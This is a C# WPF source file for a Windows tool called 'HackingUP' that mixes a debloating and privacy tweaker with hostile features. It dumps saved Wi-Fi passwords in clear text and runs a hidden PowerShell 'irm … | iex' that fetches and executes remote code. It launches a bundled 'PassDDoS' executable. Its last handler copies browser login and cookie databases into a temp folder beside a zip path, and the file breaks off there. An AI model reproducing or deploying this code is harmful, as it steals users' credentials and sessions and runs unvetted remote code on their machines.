using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Media.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Net.Http;
using System.Threading.Tasks;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO.Compression;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Linq;
using System.Net.Sockets;
using System;
using System.Management;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net.Sockets;
using System.Windows;
using System.Net.Http;
using System.Management; // Убедитесь, что эта библиотека подключена
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Windows.Media.Media3D;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace HackingUP
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public MainWindow()
        {
            InitializeComponent();

            DisplayComputerName();
            DisplayLocalIPAddress();
            DisplayInternetIPAddress();

            InitializeAsync();

        }

        private async void InitializeAsync()
        {
            ComputerNameLabel.Content = Environment.MachineName;

            MemoryInfoLabel.Content = await GetMemoryInfoAsync() + " GB";
            VideocardLabel.Content = await GetVideoCardInfoAsync();

            ComputerManufacturerLabel.Content = await GetComputerManufacturerAsync();

        }
        private void BackgroundVideo_MediaEnded(object sender, RoutedEventArgs e)
        {
            // Перематываем видео на начало и снова запускаем воспроизведение
            BackgroundVideo.Position = TimeSpan.Zero;
            BackgroundVideo.Play();
        }

        //WIFI START
        private async void ShowWifiProfiles_Click(object sender, RoutedEventArgs e)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            var process = new Process { StartInfo = psi };
            try
            {
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();

                process.WaitForExit(); // Дождитесь завершения процесса

                if (!string.IsNullOrEmpty(error))
                {
                    MessageBox.Show($"Ошибка PowerShell: {error}");
                    return;
                }

                if (string.IsNullOrWhiteSpace(output))
                {
                    MessageBox.Show("Нет доступных Wi-Fi профилей.");
                    return;
                }

                List<WifiProfile> wifiProfiles = null;
                try
                {
                    // Попытка десериализовать JSON как список профилей
                    wifiProfiles = JsonConvert.DeserializeObject<List<WifiProfile>>(output);
                }
                catch (JsonSerializationException)
                {
                    // Попытка десериализовать JSON как одиночный профиль, если он не является списком
                    var singleWifiProfile = JsonConvert.DeserializeObject<WifiProfile>(output);
                    if (singleWifiProfile != null)
                    {
                        wifiProfiles = new List<WifiProfile> { singleWifiProfile };
                    }
                }

                if (wifiProfiles == null || wifiProfiles.Count == 0)
                {
                    MessageBox.Show("Не удалось получить данные профилей Wi-Fi.");
                }
                else
                {
                    wifiDataGrid.ItemsSource = wifiProfiles;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка выполнения скрипта: {ex.Message}");
            }
        }

        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }

        //WIFI END

        //SYSTEM INFO START


        private void DisplayComputerName()
        {
            string computerName = Environment.MachineName;
            ComputerNameLabel.Content = $"{computerName}";
        }
        private void DisplayLocalIPAddress()
        {
            string localIPAddress = GetLocalIPAddress();
            LocalIPAddressLabel.Content = $"{localIPAddress}";
        }

        private string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            var ipAddress = host.AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork);
            return ipAddress?.ToString() ?? "Не удалось определить IP-адрес";
        }

        private async void DisplayInternetIPAddress()
        {
            string internetIPAddress = await GetInternetIPAddress();
            InternetIPAddressLabel.Content = $"{internetIPAddress}";
        }



        private async Task<string> GetInternetIPAddress()
        {
            using (var httpClient = new HttpClient())
            {
                try
                {
                    string response = await httpClient.GetStringAsync("https://api.ipify.org");
                    return response;
                }
                catch (Exception)
                {
                    return "Не удалось определить интернет IP-адрес";
                }
            }
        }


        private async Task<string> GetComputerManufacturerAsync()
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            process.Start();
            string manufacturer = await process.StandardOutput.ReadToEndAsync();
            await Task.Run(() => process.WaitForExit());

            return manufacturer.Trim();
        }









        private async Task<string> GetMemoryInfoAsync()
        {
            string psCommand = "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {'{0:N0}' -f ([math]::round(($_.Sum / 1GB),0))}";
            return await RunPowerShellCommandAsync(psCommand);
        }

        private async Task<string> GetVideoCardInfoAsync()
        {
            string psCommand = "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name";
            return await RunPowerShellCommandAsync(psCommand);
        }

        private async Task<string> RunPowerShellCommandAsync(string command)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command \"{command}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            process.Start();
            string result = await process.StandardOutput.ReadToEndAsync();
            await Task.Run(() => process.WaitForExit());

            return result.Trim();
        }








        private void OpenExeButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // Получаем путь к каталогу, где находится исполняемый файл приложения
                string exePath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PassDDoS 3.5 x64.exe");

                // Запускаем exe файл
                Process.Start(exePath);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Ошибка при запуске exe файла: " + ex.Message);
            }
        }

        private async void Button_Click(object sender, RoutedEventArgs e)
        {
            // Показать ProgressBar и инициализировать его
            progressBar.Visibility = Visibility.Visible;
            progressBar.IsIndeterminate = true; // Используйте неопределенный режим, если вы не можете измерить прогресс

            // Запуск длительной операции в отдельном потоке
            await Task.Run(() =>
            {
                ProcessStartInfo startInfo = new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "irm https://massgrave.dev/get | iex",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process process = new Process() { StartInfo = startInfo })
                {
                    process.Start();
                    process.WaitForExit();
                }
            });

            // Скрыть ProgressBar после завершения операции
            progressBar.Visibility = Visibility.Collapsed;
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            string url = "https://drive.google.com/file/d/1XovreMHh2Xd3bugVRl3H5EBUH6fagwFH/view?usp=drive_link";

            try
            {
                // Открытие URL в браузере по умолчанию
                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
            }
            catch (Exception ex)
            {
                // Если произошла ошибка, показываем сообщение
                MessageBox.Show($"Не удалось открыть ссылку: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            string url = "https://gist.github.com/PurpleVibe32/1e9b30754ff18d69ad48155ed29d83de";

            try
            {
                // Открытие URL в браузере по умолчанию
                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
            }
            catch (Exception ex)
            {
                // Если произошла ошибка, показываем сообщение
                MessageBox.Show($"Не удалось открыть ссылку: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }


        //5
        private async void Button_Click_3(object sender, RoutedEventArgs e)
        {
            progressBar1.Visibility = Visibility.Visible;

            var packageNames = new List<string>
    {
        "AdobeSystemsIncorporated.AdobePhotoshopExpress",
        "CandyCrush",
        "Duolingo",
        "EclipseManager",
        "Facebook",
        "king.com.FarmHeroesSaga",
        "Flipboard",
        "HiddenCityMysteryofShadows",
        "HuluLLC.HuluPlus",
        "Pandora",
        "Plex",
        "ROBLOXCORPORATION.ROBLOX",
        "Spotify",
        "Twitter",
        "Microsoft.549981C3F5F10"
    };

            int totalPackages = packageNames.Count;
            progressBar1.Maximum = totalPackages;

            for (int i = 0; i < totalPackages; i++)
            {
                RemoveApp(packageNames[i]);
                progressBar1.Value = i + 1;
                await Task.Delay(500); // небольшая задержка для имитации выполнения длительной операции
            }

            progressBar1.Visibility = Visibility.Collapsed;
            MessageBox.Show("All specified packages have been processed.");
        }

        private void RemoveApp(string packageName)
        {
            string checkCommand = $"Get-AppxPackage -Name *{packageName}*";
            string removeCommand = $"Get-AppxPackage -Name *{packageName}* | Remove-AppxPackage";
            ProcessStartInfo startInfoCheck = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{checkCommand}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };
            Process processCheck = null;
            Process processRemove = null;
            try
            {
                processCheck = Process.Start(startInfoCheck);
                string output = processCheck.StandardOutput.ReadToEnd();
                processCheck.WaitForExit();
                if (string.IsNullOrWhiteSpace(output))
                {
                    // Пакет не установлен
                    Console.WriteLine($"Package {packageName} is not installed.");
                    return;
                }
                ProcessStartInfo startInfoRemove = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{removeCommand}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };
                processRemove = Process.Start(startInfoRemove);
                processRemove.WaitForExit();
                if (processRemove.ExitCode == 0)
                {
                    // Удаление прошло успешно
                    Console.WriteLine($"Package {packageName} removed successfully.");
                }
                else
                {
                    // Ошибка при удалении
                    Console.WriteLine($"Failed to remove package {packageName}.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error removing package {packageName}: {ex.Message}");
            }
            finally
            {
                processCheck?.Dispose();
                processRemove?.Dispose();
            }
        }

        private async void Button_Click_4(object sender, RoutedEventArgs e)
        {

            progressBar2.Visibility = Visibility.Visible;

            var packageNames = new List<string>
    {
        "Microsoft.BingWeather",
        "Microsoft.GetHelp",
        "Microsoft.Microsoft3DViewer",
        "Microsoft.MicrosoftOfficeHub",
        "Microsoft.MicrosoftStickyNotes",
        "Microsoft.Office.OneNote",
        "Microsoft.People",
        "Microsoft.ScreenSketch",
        "Microsoft.Wallet",
        "Microsoft.WindowsFeedbackHub",
        "Microsoft.WindowsMaps",
        "Microsoft.YourPhone",
        "Microsoft.SkypeApp",
        "microsoft.windowscommunicationsapps",
        "Microsoft.MixedReality.Portal",
        "Microsoft.MicrosoftSolitaireCollection",
        "Microsoft.549981C3F5F10"
     
    };

            int totalPackages = packageNames.Count;
            progressBar2.Maximum = totalPackages;

            for (int i = 0; i < totalPackages; i++)
            {
                RemoveApp(packageNames[i]);
                progressBar2.Value = i + 1;
                await Task.Delay(500); // небольшая задержка для имитации выполнения длительной операции
            }

      

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-WindowStyle Hidden -Command \"& {Start-Process 'C:\\Windows\\SysWOW64\\OneDriveSetup.exe' -ArgumentList '/uninstall' -Verb RunAs -WindowStyle Hidden}\"";
            Process process = Process.Start(psi);
            process.WaitForExit();

            progressBar2.Visibility = Visibility.Collapsed;
            MessageBox.Show("All specified packages have been processed.");

        }

        private async void Button_Click_5(object sender, RoutedEventArgs e)
        {
            progressBar3.Visibility = Visibility.Visible;

            var actions = new Func<bool>[]
            {
            Action1,
            Action2,
            Action3,
            Action4,
            Action5,
            Action6,
            Action7,
            Action8,
            Action9,
            Action10,
            Action11,
            Action12,
            Action13,
            Action14,
            Action15,
            Action16,
            Action17,
            Action18,
            Action19,
            Action20,
            Action21,
            Action22,
            Action26,
            Action27,
            Action28,
            Action29,
            Action30,
            Action31,
            Action32
            };

            progressBar3.Maximum = actions.Length;

            bool allSuccessful = true;

            for (int i = 0; i < actions.Length; i++)
            {
                if (!actions[i]())
                {
                    allSuccessful = false;
                }

                progressBar3.Value = i + 1;
                await Task.Delay(100); // небольшая задержка для обновления UI
            }

            progressBar3.Visibility = Visibility.Collapsed;
            MessageBox.Show(allSuccessful ? "All actions completed successfully." : "Some actions failed.");
        }

        private bool Action1()
        {
            try
            {
                SetRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AdvertisingInfo", "Enabled", 0);
                SetRegistryValue(Registry.CurrentUser, "Control Panel\\International\\User Profile", "HttpAcceptLanguageOptOut", 1);
                SetRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Start_TrackProgs", 0);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action2()
        {
            try
            {
                SetRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Speech_OneCore\\Settings\\OnlineSpeechPrivacy", "HasAccepted", 0);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action3()
        {
            try
            {
                SetRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Personalization\\Settings", "AcceptedPrivacyPolicy", 0);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action4()
        {
            try
            {
                SetRegistryValue(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\DataCollection", "AllowTelemetry", 3);
                SetRegistryValue(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\DataCollection", "MaxTelemetryAllowed", 3);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action5()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action6()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\userNotificationListener", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action7()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\userAccountInformation", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action8()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\contacts", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action9()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\appointments", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action10()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\phoneCall", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action11()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\phoneCallHistory", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action12()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\email", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action13()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\userDataTasks", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action14()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\chat", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action15()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\radios", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action16()
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications", writable: true);
                if (registryKey != null)
                {
                    registryKey.SetValue("GlobalUserDisabled", 1, RegistryValueKind.DWord);
                    registryKey.Close();
                }
                else
                {
                    RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications");
                    registryKey2?.SetValue("GlobalUserDisabled", 1, RegistryValueKind.DWord);
                    registryKey2?.Close();
                }

                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Search", writable: true);
                if (key != null)
                {
                    key.SetValue("BackgroundAppGlobalToggle", 0, RegistryValueKind.DWord);
                    key.Close();
                }
                else
                {
                    RegistryKey newKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Search");
                    newKey?.SetValue("BackgroundAppGlobalToggle", 0, RegistryValueKind.DWord);
                    newKey?.Close();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action17()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\appDiagnostics", "Value", "Deny", RegistryValueKind.String);
        }

        private bool Action18()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "TaskbarGlomLevel", 1, RegistryValueKind.DWord);
        }

        private bool Action19()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "LaunchTo", 1, RegistryValueKind.DWord);
        }

        private bool Action20()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
                if (key != null)
                {
                    key.SetValue("EnableXamlStartMenu", 0, RegistryValueKind.DWord);
                    key.Close();
                }
                else
                {
                    RegistryKey newKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
                    newKey?.SetValue("EnableXamlStartMenu", 0, RegistryValueKind.DWord);
                    newKey?.Close();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action21()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
                if (key != null)
                {
                    key.SetValue("Start_TrackDocs", 0, RegistryValueKind.DWord);
                    key.Close();
                }
                else
                {
                    RegistryKey newKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
                    newKey?.SetValue("Start_TrackDocs", 0, RegistryValueKind.DWord);
                    newKey?.Close();
                }

                key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace_36354489", writable: true);
                if (key != null)
                {
                    string[] subKeyNames = key.GetSubKeyNames();
                    if (subKeyNames.Contains("{f874310e-b6b7-47dc-bc84-b9e6b38f5903}"))
                    {
                        key.DeleteSubKey("{f874310e-b6b7-47dc-bc84-b9e6b38f5903}");
                    }
                    key.Close();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action22()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Clipboard", "EnableClipboardHistory", 0, RegistryValueKind.DWord);
        }

        private bool Action26()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "powercfg /s SCHEME_MIN",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            try
            {
                Process process = Process.Start(startInfo);
                process.WaitForExit();
                bool success = process.ExitCode == 0;
                process.Close();
                return success;
            }
            catch
            {
                return false;
            }
        }

        private bool Action27()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Feeds", "ShellFeedsTaskbarViewMode", 2, RegistryValueKind.DWord);
        }

        private bool Action28()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Search", writable: true);
                if (key != null)
                {
                    key.SetValue("SearchboxTaskbarMode", 1, RegistryValueKind.DWord);
                    key.SetValue("SearchboxTaskbarModePrevious", 2, RegistryValueKind.DWord);
                    key.SetValue("TraySearchBoxVisible", 0, RegistryValueKind.DWord);
                    key.SetValue("TraySearchBoxVisibleOnAnyMonitor", 0, RegistryValueKind.DWord);
                    key.Close();
                }
                else
                {
                    RegistryKey newKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Search");
                    newKey?.SetValue("SearchboxTaskbarMode", 1, RegistryValueKind.DWord);
                    newKey?.SetValue("SearchboxTaskbarModePrevious", 2, RegistryValueKind.DWord);
                    newKey?.SetValue("TraySearchBoxVisible", 0, RegistryValueKind.DWord);
                    newKey?.SetValue("TraySearchBoxVisibleOnAnyMonitor", 0, RegistryValueKind.DWord);
                    newKey?.Close();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool Action29()
        {
            string[] keysToDelete = new string[]
            {
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{24ad3ad4-a569-4530-98e1-ab02f9417aa8}",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{3dfdf296-dbec-4fb4-81d1-6a3438bcf4de}",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A}"
            };

            bool allDeleted = true;
            foreach (string keyPath in keysToDelete)
            {
                try
                {
                    RegistryKey baseKey = Registry.LocalMachine.OpenSubKey(keyPath, writable: true);
                    if (baseKey != null)
                    {
                        baseKey.DeleteSubKey(keyPath);
                        baseKey.Close();
                    }
                    else
                    {
                        allDeleted = false;
                    }
                }
                catch
                {
                    allDeleted = false;
                }
            }
            return allDeleted;
        }

        private bool Action30()
        {
            try
            {
                string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string scriptPath = System.IO.Path.Combine(appDirectory, "StartMenuLayout.ps1");
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -File \"{scriptPath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                Process process = new Process { StartInfo = psi };
                process.Start();
                process.WaitForExit();
                string errors = process.StandardError.ReadToEnd();
                process.Close();
                return string.IsNullOrEmpty(errors);
            }
            catch
            {
                return false;
            }
        }

        private bool Action31()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "Software\\Classes\\CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}", "System.IsPinnedToNameSpaceTree", 0, RegistryValueKind.DWord);
        }

        private bool Action32()
        {
            return ModifyRegistryValue(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowTaskViewButton", 0, RegistryValueKind.DWord);
        }

        private static bool ModifyRegistryValue(RegistryKey root, string subKeyPath, string valueName, object valueData, RegistryValueKind valueKind)
        {
            try
            {
                RegistryKey key = root.OpenSubKey(subKeyPath, writable: true) ?? root.CreateSubKey(subKeyPath);
                if (key != null)
                {
                    key.SetValue(valueName, valueData, valueKind);
                    key.Close();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static void SetRegistryValue(RegistryKey root, string subKeyPath, string valueName, object valueData)
        {
            RegistryKey subKey = root.CreateSubKey(subKeyPath);
            if (subKey != null)
            {
                subKey.SetValue(valueName, valueData, RegistryValueKind.DWord);
                subKey.Close();
            }
            else
            {
                throw new Exception("Failed to create or open the registry key.");
            }
        }

        private void Button_Click_6(object sender, RoutedEventArgs e)
        {
            // Путь к изображению из той же папки, что и исполняемый файл
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string wallpaperPath = System.IO.Path.Combine(appDirectory, "Dark.jpg");

            // Убедитесь, что у вас есть класс WallpaperChanger с методом SetWallpaper
            WallpaperChanger.SetWallpaper(wallpaperPath);

            string keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize";
            bool operationSuccess = false;

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, writable: true))
                {
                    if (key != null)
                    {
                        key.SetValue("AppsUseLightTheme", 0, RegistryValueKind.DWord);
                        key.SetValue("SystemUsesLightTheme", 0, RegistryValueKind.DWord);
                        operationSuccess = true;
                    }
                    else
                    {
                        MessageBox.Show("Не удалось открыть ключ реестра.");
                    }
                }
            }

            catch (Exception ex)
            {
                MessageBox.Show("Ошибка: " + ex.Message);
                operationSuccess = false;
            }

            if (operationSuccess)
            {
                // Добавьте здесь код для успешной операции, если требуется
            }
            else
            {
                // Добавьте здесь код для неудачной операции, если требуется
            }
        } //Dark

        private void Button_Click_7(object sender, RoutedEventArgs e) //White
        {
            // Путь к изображению из той же папки, что и исполняемый файл
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string wallpaperPath = System.IO.Path.Combine(appDirectory, "White.jpg");

            // Убедитесь, что у вас есть класс WallpaperChanger с методом SetWallpaper
            WallpaperChanger.SetWallpaper(wallpaperPath);

            string keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize";
            bool operationSuccess = false;

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, writable: true))
                {
                    if (key != null)
                    {
                        key.SetValue("AppsUseLightTheme", 1, RegistryValueKind.DWord);
                        key.SetValue("SystemUsesLightTheme", 1, RegistryValueKind.DWord);
                        operationSuccess = true;
                    }
                    else
                    {
                        MessageBox.Show("Не удалось открыть ключ реестра.");
                    }
                }
            }

            catch (Exception ex)
            {
                MessageBox.Show("Ошибка: " + ex.Message);
                operationSuccess = false;
            }

            if (operationSuccess)
            {
                // Добавьте здесь код для успешной операции, если требуется
            }
            else
            {
                // Добавьте здесь код для неудачной операции, если требуется
            }
        }

        private void Button_Click_8(object sender, RoutedEventArgs e)
        {
            string url = "https://sites.google.com/view/prototypea";

            try
            {
                // Открытие URL в браузере по умолчанию
                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
            }
            catch (Exception ex)
            {
                // Если произошла ошибка, показываем сообщение
                MessageBox.Show($"Не удалось открыть ссылку: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }





























        private async void Button_Click22(object sender, RoutedEventArgs e)
        {
            string userFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string edgeSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Microsoft\Edge\User Data\Default\Login Data");
            string chromeSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Google\Chrome\User Data\Default\Cookies");
            string yandexSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies");

            string edgeTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Edge Cookies");
            string chromeTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Chrome Cookies");
            string yandexTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Yandex Cookies");

            string infoTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "SystemInfo.txt");
            string zipFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Info System.zip");

            try
            {
                var filesToCopy = new List<(string SourcePath, string TempPath)>
                {
                    (edgeSourceFilePath, edgeTempFilePath),
                    (chromeSourceFilePath, chromeTempFilePath),
